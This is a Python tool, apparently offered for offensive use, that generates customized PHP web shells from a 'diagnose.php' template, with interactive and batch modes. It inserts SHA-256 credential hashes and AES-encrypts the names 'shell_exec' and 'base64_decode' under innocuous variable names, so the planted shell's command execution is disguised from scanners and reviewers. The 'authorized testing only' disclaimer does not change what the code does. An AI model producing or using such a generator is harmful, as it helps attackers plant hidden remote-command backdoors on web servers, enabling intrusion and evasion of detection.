#!/usr/bin/env python3
"""
Shell Generator - Customizable Web Shell Builder
Description: For authorized penetration testing and offensive security operations only.
Autor: syro
"""

import hashlib
import base64
import argparse
import sys
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class syshellGenerator:
    def __init__(self):
        self.template_file = "diagnose.php"
        
    def generate_sha256_hash(self, text):
        """Generate SHA-256 hash of input text"""
        return hashlib.sha256(text.encode('utf-8')).hexdigest()
    
    def encrypt_aes_256_cbc(self, plaintext, password):
        """Encrypt plaintext using AES-256-CBC with password-derived key"""
        # Generate key from password (same as PHP hash('sha256', $password, true))
        key = hashlib.sha256(password.encode('utf-8')).digest()
        iv = key[:16]  # Use first 16 bytes of key as IV
        
        # Pad plaintext to multiple of 16 bytes (PKCS7 padding)
        padding_length = 16 - (len(plaintext) % 16)
        padded_plaintext = plaintext + chr(padding_length) * padding_length
        
        # Encrypt
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_plaintext.encode('utf-8')) + encryptor.finalize()
        
        return base64.b64encode(ciphertext).decode('utf-8')
    
    def generate_encrypted_values(self, password):
        """Generate encrypted function names for the web shell"""
        diag_log_parser = self.encrypt_aes_256_cbc('shell_exec', password)
        data_stream_filter = self.encrypt_aes_256_cbc('base64_decode', password)
        
        return diag_log_parser, data_stream_filter
    
    def read_template(self, template_path=None):
        """Read the web shell template"""
        if template_path:
            self.template_file = template_path
            
        if not os.path.exists(self.template_file):
            print(f"[!] Template file '{self.template_file}' not found!")
            print("[!] Make sure the diagnose.php template is in the same directory.")
            return None
            
        try:
            with open(self.template_file, 'r', encoding='utf-8') as f:
                return f.read()
        except Exception as e:
            print(f"[!] Error reading template file: {e}")
            return None
    
    def generate_webshell(self, username, password, output_file=None, template_path=None):
        """Generate customized web shell with specified credentials"""
        print(f"[+] Generating web shell with credentials:")
        print(f"    Username: {username}")
        print(f"    Password: {'*' * len(password)}")
        
        # Generate hashes
        user_hash = self.generate_sha256_hash(username)
        pass_hash = self.generate_sha256_hash(password)
        
        print(f"[+] Generated hashes:")
        print(f"    User hash: {user_hash}")
        print(f"    Pass hash: {pass_hash}")
        
        # Generate encrypted function names
        diag_log_parser, data_stream_filter = self.generate_encrypted_values(password)
        
        print(f"[+] Generated encrypted values:")
        print(f"    diagLogParser: {diag_log_parser}")
        print(f"    dataStreamFilter: {data_stream_filter}")
        
        # Read template
        template_content = self.read_template(template_path)
        if not template_content:
            return False
        
        # Replace placeholders in template
        customized_content = template_content.replace(
            "$stored_user_hash = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918';",
            f"$stored_user_hash = '{user_hash}';"
        ).replace(
            "$stored_pass_hash = '343fcb40497549085c98ae137c137116a5c2442eb8dc0bf0cac3a3419ce05b9f';",
            f"$stored_pass_hash = '{pass_hash}';"
        ).replace(
            "$diagLogParser     = '/Zt5QH2C9Rao8UYQlRy9/w==';",
            f"$diagLogParser     = '{diag_log_parser}';"
        ).replace(
            "$dataStreamFilter  = 'u1Awy/VCOf940h0mhny+sA==';",
            f"$dataStreamFilter  = '{data_stream_filter}';"
        )
        
        # Determine output filename
        if not output_file:
            output_file = f"syshell_{username}_{hashlib.md5(password.encode()).hexdigest()[:8]}.php"
        
        # Write customized web shell
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(customized_content)
            print(f"[+] Web shell generated successfully: {output_file}")
            return True
        except Exception as e:
            print(f"[!] Error writing output file: {e}")
            return False
    
    def interactive_mode(self):
        """Interactive mode for generating web shells"""
        print("=" * 60)
        print("syshell Generator - Interactive Mode")
        print("For authorized penetration testing and offensive security operations only!")
        print("=" * 60)
        
        try:
            username = input("Enter username: ").strip()
            if not username:
                print("[!] Username cannot be empty!")
                return False
                
            password = input("Enter password: ").strip()
            if not password:
                print("[!] Password cannot be empty!")
                return False
            
            output_file = input("Output filename (press Enter for auto-generated): ").strip()
            if not output_file:
                output_file = None
                
            template_path = input("Template path (press Enter for 'diagnose.php'): ").strip()
            if not template_path:
                template_path = None
            
            print("\n" + "=" * 60)
            return self.generate_webshell(username, password, output_file, template_path)
            
        except KeyboardInterrupt:
            print("\n[!] Operation cancelled by user.")
            return False
    
    def batch_generate(self, credentials_list, output_dir="output"):
        """Generate multiple web shells from a list of credentials"""
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        successful = 0
        total = len(credentials_list)
        
        print(f"[+] Batch generating {total} web shells...")
        
        for i, (username, password) in enumerate(credentials_list, 1):
            print(f"\n[+] Processing {i}/{total}: {username}")
            
            output_file = os.path.join(output_dir, f"syshell_{username}_{hashlib.md5(password.encode()).hexdigest()[:8]}.php")
            
            if self.generate_webshell(username, password, output_file):
                successful += 1
            else:
                print(f"[!] Failed to generate web shell for {username}")
        
        print(f"\n[+] Batch generation complete: {successful}/{total} successful")
        return successful == total

def main():
    parser = argparse.ArgumentParser(
        description="syshell Generator - Customizable Web Shell Builder",
        epilog="For authorized penetration testing and offensive security operations only!"
    )
    
    parser.add_argument('-u', '--username', help='Username for web shell authentication')
    parser.add_argument('-p', '--password', help='Password for web shell authentication')
    parser.add_argument('-o', '--output', help='Output filename for generated web shell')
    parser.add_argument('-t', '--template', help='Path to web shell template file', default='diagnose.php')
    parser.add_argument('-i', '--interactive', action='store_true', help='Run in interactive mode')
    parser.add_argument('-b', '--batch', help='Batch generate from file (format: username:password per line)')
    parser.add_argument('--test-encryption', action='store_true', help='Test encryption compatibility with PHP')
    
    args = parser.parse_args()
    
    generator = syshellGenerator()
    
    # Test encryption compatibility
    if args.test_encryption:
        print("[+] Testing encryption compatibility...")
        test_password = "SuperSecret123"
        diag_log, data_stream = generator.generate_encrypted_values(test_password)
        
        print(f"Python generated:")
        print(f"  diagLogParser: {diag_log}")
        print(f"  dataStreamFilter: {data_stream}")
        print(f"\nExpected (from PHP):")
        print(f"  diagLogParser: /Zt5QH2C9Rao8UYQlRy9/w==")
        print(f"  dataStreamFilter: u1Awy/VCOf940h0mhny+sA==")
        
        if diag_log == "/Zt5QH2C9Rao8UYQlRy9/w==" and data_stream == "u1Awy/VCOf940h0mhny+sA==":
            print("[+] Encryption compatibility test PASSED!")
        else:
            print("[!] Encryption compatibility test FAILED!")
        return
    
    # Interactive mode
    if args.interactive:
        generator.interactive_mode()
        return
    
    # Batch mode
    if args.batch:
        if not os.path.exists(args.batch):
            print(f"[!] Batch file '{args.batch}' not found!")
            sys.exit(1)
        
        credentials = []
        try:
            with open(args.batch, 'r') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            credentials.append((parts[0], parts[1]))
                        else:
                            print(f"[!] Invalid format on line {line_num}: {line}")
        except Exception as e:
            print(f"[!] Error reading batch file: {e}")
            sys.exit(1)
        
        if credentials:
            generator.batch_generate(credentials)
        else:
            print("[!] No valid credentials found in batch file!")
        return
    
    # Command line mode
    if args.username and args.password:
        generator.generate_webshell(args.username, args.password, args.output, args.template)
    else:
        if not args.username:
            print("[!] Username required. Use -u or --interactive mode.")
        if not args.password:
            print("[!] Password required. Use -p or --interactive mode.")
        print("\nUse --help for usage information or -i for interactive mode.")

if __name__ == "__main__":
    # Check for required dependencies
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher
    except ImportError:
        print("[!] Missing required dependency: cryptography")
        print("[!] Install with: pip install cryptography")
        sys.exit(1)
    
    main()
